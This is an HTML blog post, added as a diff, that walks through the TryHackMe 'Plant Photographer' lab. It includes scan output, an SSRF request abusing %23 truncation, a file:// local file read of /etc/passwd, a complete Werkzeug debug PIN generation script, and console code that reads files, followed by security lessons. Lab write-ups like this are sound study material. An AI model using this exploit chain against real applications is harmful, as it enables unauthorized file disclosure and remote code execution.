@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Plant Photographer | Shadow Logs</title>
+    <meta
+      name="description"
+      content="TryHackMe Plant Photographer writeup covering enumeration, SSRF, Werkzeug console access, and flag retrieval."
+    />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&family=Manrope:wght@400;500;600;700;800&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="../styles.css" />
+    <script src="../script.js" defer></script>
+  </head>
+  <body>
+    <div class="page-shell">
+      <header class="site-header">
+        <a class="brand" href="../index.html">Shadow Logs</a>
+        <nav class="site-nav">
+          <a href="../index.html">Home</a>
+          <a href="../blog.html">Blog</a>
+        </nav>
+      </header>
+
+      <main class="post-layout">
+        <article class="post-article">
+          <p class="eyebrow">TryHackMe Writeup</p>
+          <h1>Plant Photographer</h1>
+          <p class="post-meta">TryHackMe • Web • SSRF • Werkzeug</p>
+
+          <p class="lead">
+            Plant Photographer looks simple at first, but the interesting path
+            comes from chaining a file download feature into SSRF, turning that
+            into local file disclosure, abusing an internal admin route, and
+            then using the Werkzeug debug console correctly to recover the
+            remaining flag.
+          </p>
+
+          <section>
+            <h2>Room Link</h2>
+            <p>
+              Challenge URL:
+              <a
+                class="text-link"
+                href="https://tryhackme.com/room/plantphotographer"
+                target="_blank"
+                rel="noreferrer"
+                >Plant Photographer on TryHackMe</a
+              >
+            </p>
+          </section>
+
+          <section>
+            <h2>Step 1: Initial Enumeration</h2>
+            <p>
+              I started with a full TCP scan. Only SSH and HTTP were exposed,
+              and the web service was running Werkzeug on Python 3.10. That was
+              already a good sign that a Flask-style development setup might be
+              involved.
+            </p>
+
+            <pre><code>nmap -sC -sV -p- --min-rate 5000 10.49.167.191 -oN nmap_out.txt
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-28 05:46 +0530
+Nmap scan report for 10.49.167.191
+Host is up (0.025s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 b0:fb:2b:30:df:66:87:e0:64:0b:f4:91:e5:30:03:5e (RSA)
+|   256 3e:55:89:8f:36:cf:fe:b4:30:d3:4b:b7:d2:3b:b8:22 (ECDSA)
+|_  256 4c:df:76:4d:02:5b:f5:e7:2a:65:89:49:24:8f:0c:16 (ED25519)
+80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.10.7)
+|_http-title: Jay Green
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.91 seconds</code></pre>
+          </section>
+
+          <section>
+            <h2>Step 2: Directory Discovery</h2>
+            <p>
+              After that I ran Gobuster and found three interesting paths:
+              <code>/download</code>, <code>/admin</code>, and
+              <code>/console</code>.
+            </p>
+
+            <pre><code>gobuster dir -u http://10.49.167.191 \
+  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium_clean.txt \
+  -x git,json -o gobuster_out.txt
+
+===============================================================
+Gobuster v3.5
+===============================================================
+/download             (Status: 200) [Size: 20]
+/admin                (Status: 200) [Size: 48]
+/console              (Status: 200) [Size: 1985]</code></pre>
+
+            <p>
+              The debug console was locked, so it was not immediately useful.
+              The more interesting part was the download feature, because it
+              turned out to be vulnerable to SSRF.
+            </p>
+          </section>
+
+          <section>
+            <h2>Step 3: SSRF Through the Download Feature</h2>
+            <p>
+              While testing the PDF download behavior through Burp Suite, I
+              found that the server would fetch internal resources on my behalf.
+              I tried several bypass ideas first, but the useful breakthrough
+              was appending <code>%23</code>, which is a URL-encoded
+              <code>#</code> fragment marker.
+            </p>
+
+            <p>
+              The important detail was that the backend built a URL in the form
+              of:
+            </p>
+
+            <pre><code>server + "/public-docs-.../&lt;id&gt;.pdf"</code></pre>
+
+            <p>
+              Since the <code>server</code> value was user-controlled, this
+              created a classic SSRF primitive. The trick was finding a way to
+              stop the application from appending the unwanted suffix cleanly.
+            </p>
+
+            <p>
+              Using the following request let me reach the internal admin
+              endpoint and retrieve a PDF that contained the second flag:
+            </p>
+
+            <pre><code>GET /download?server=http://localhost:8087/admin%23&amp;id=75482342 HTTP/1.1
+Host: TARGET_IP
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://TARGET_IP/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive</code></pre>
+
+            <p>
+              After receiving the response in Burp Suite, I used
+              <code>Show response in browser</code>, downloaded the PDF, and
+              recovered the second flag from it.
+            </p>
+          </section>
+
+          <section>
+            <h2>Step 4: SSRF to Local File Read</h2>
+            <p>
+              Once the SSRF behavior was confirmed, the next step was to push it
+              further. Because <code>%23</code> acts like a fragment marker, it
+              could be used to truncate the rest of the generated path and turn
+              the endpoint into a local file reader.
+            </p>
+
+            <pre><code>file:///etc/passwd%23</code></pre>
+
+            <p>
+              With that trick, I could read files directly from the server
+              instead of only requesting internal HTTP routes.
+            </p>
+
+            <p>The most useful files were:</p>
+            <ul>
+              <li><code>/etc/passwd</code> to confirm usernames such as <code>root</code></li>
+              <li><code>/proc/self/cgroup</code> to inspect Docker-related identifiers</li>
+              <li><code>/sys/class/net/eth0/address</code> to recover the MAC address</li>
+            </ul>
+
+            <p>
+              At this point, the challenge had moved from SSRF into local file
+              disclosure, which turned out to be the missing piece for the
+              Werkzeug debugger.
+            </p>
+          </section>
+
+          <section>
+            <h2>Step 5: Source Code Disclosure and Debug Clues</h2>
+            <p>
+              Reading local files also made it possible to inspect application
+              source and confirm how the internal routes worked. The source
+              revealed two especially important facts:
+            </p>
+            <ul>
+              <li><code>/admin</code> was only intended to be reachable from <code>localhost</code></li>
+              <li>the application was running in Flask debug mode, which meant the Werkzeug debugger was active</li>
+            </ul>
+
+            <p>
+              That changed the objective. Instead of only abusing SSRF for file
+              retrieval, I now knew there was a reachable debug console behind
+              the application and that the remaining challenge was generating
+              the correct PIN.
+            </p>
+          </section>
+
+          <section>
+            <h2>Step 6: Unlocking the Werkzeug Console</h2>
+            <p>
+              The third flag took more time than it should have, mainly because
+              understanding the Werkzeug PIN generation process properly matters.
+              The first scripts I found online were not a good match for this
+              version and environment, so I had to rebuild the logic carefully
+              with the right values.
+            </p>
+
+            <p>
+              Once I gathered the missing pieces and used the correct algorithm,
+              I generated the valid debug PIN and unlocked the console.
+            </p>
+
+            <p>
+              The source code and leaked local files provided the required
+              values used by Werkzeug to derive the PIN:
+            </p>
+            <ul>
+              <li>username</li>
+              <li>module name: <code>flask.app</code></li>
+              <li>application name: <code>Flask</code></li>
+              <li>module file path</li>
+              <li>MAC address from <code>uuid.getnode()</code></li>
+              <li>machine identifier information influenced by the Docker environment</li>
+            </ul>
+
+            <pre><code>import hashlib
+from itertools import chain
+
+probably_public_bits = [
+    "root",
+    "flask.app",
+    "Flask",
+    "/usr/local/lib/python3.10/site-packages/flask/app.py",
+]
+
+private_bits = [
+    "2485378088962",
+    "77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca",
+]
+
+h = hashlib.md5()
+for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode("utf-8")
+    h.update(bit)
+
+h.update(b"cookiesalt")
+cookie_name = "__wzd" + h.hexdigest()[:20]
+
+h.update(b"pinsalt")
+num = ("%09d" % int(h.hexdigest(), 16))[:9]
+
+for group_size in (5, 4, 3):
+    if len(num) % group_size == 0:
+        pin = "-".join(
+            num[x : x + group_size].rjust(group_size, "0")
+            for x in range(0, len(num), group_size)
+        )
+        break
+else:
+    pin = num
+
+print(pin)</code></pre>
+
+            <p>
+              The important part here was not just having a script, but using
+              the right public and private bits for the target environment.
+            </p>
+          </section>
+
+          <section>
+            <h2>Step 7: Console Access and Final Flag Extraction</h2>
+            <p>
+              After unlocking the Werkzeug console, arbitrary Python execution
+              became possible inside the application context. That made final
+              flag extraction much easier.
+            </p>
+
+            <p>
+              The first step was to inspect the document directory and identify
+              the interesting file name:
+            </p>
+
+            <pre><code>import os
+os.listdir("/usr/src/app/public-docs")</code></pre>
+
+            <p>
+              After identifying the <code>.txt</code> file, I could read it
+              directly:
+            </p>
+
+            <pre><code>open("/usr/src/app/public-docs/&lt;file&gt;.txt").read()</code></pre>
+
+            <p>
+              In my path, I also reused the SSRF workflow through Burp Suite
+              with the discovered file name to retrieve the final flag cleanly.
+            </p>
+          </section>
+
+          <section>
+            <h2>Key Takeaways</h2>
+            <p>
+              This room chains several very realistic issues together:
+            </p>
+            <ul>
+              <li>SSRF through a user-controlled backend fetch</li>
+              <li>URL parsing quirks using <code>%23</code> to truncate unwanted suffixes</li>
+              <li>local file disclosure through <code>file://</code> access</li>
+              <li>debug-mode exposure through Werkzeug</li>
+              <li>container-specific identifiers leaking through <code>/proc/self/cgroup</code></li>
+            </ul>
+            <p>
+              A small SSRF bug became much more serious because it was able to
+              expose the exact environmental details needed to reach the debug
+              console.
+            </p>
+          </section>
+
+          <section>
+            <h2>Security Lessons</h2>
+            <ul>
+              <li>Never expose Flask debug mode in a reachable environment</li>
+              <li>Do not build backend URLs directly from untrusted user input</li>
+              <li>Validate and restrict SSRF targets aggressively</li>
+              <li>Be careful with URL parsing edge cases such as fragment handling</li>
+              <li>Remember that Docker metadata and process files often leak useful identifiers</li>
+            </ul>
+          </section>
+
+          <section>
+            <h2>Conclusion</h2>
+            <p>
+              The full path here was a strong chained exploit:
+              <code>SSRF -&gt; local file read -&gt; Werkzeug debugger access -&gt; Python execution -&gt; flag extraction</code>.
+              Each step on its own was useful, but together they led to full
+              compromise of the challenge flow.
+            </p>
+          </section>
+
+          <a class="button button-primary" href="../blog.html">Back to blog</a>
+        </article>
+
+        <aside class="post-sidebar">
+          <div class="sidebar-card">
+            <p class="card-label">Attack Chain</p>
+            <ul>
+              <li>Enumerate exposed HTTP service</li>
+              <li>Find interesting routes with Gobuster</li>
+              <li>Use SSRF in the download feature</li>
+              <li>Reach the internal admin path</li>
+              <li>Generate the correct Werkzeug PIN</li>
+              <li>Reuse SSRF to fetch the remaining flag</li>
+            </ul>
+          </div>
+        </aside>
+      </main>
+
+      <footer class="site-footer">
+        <p>Shadow Logs</p>
+        <p>Documenting the journey from recon to root.</p>
+      </footer>
+    </div>
+  </body>
+</html>
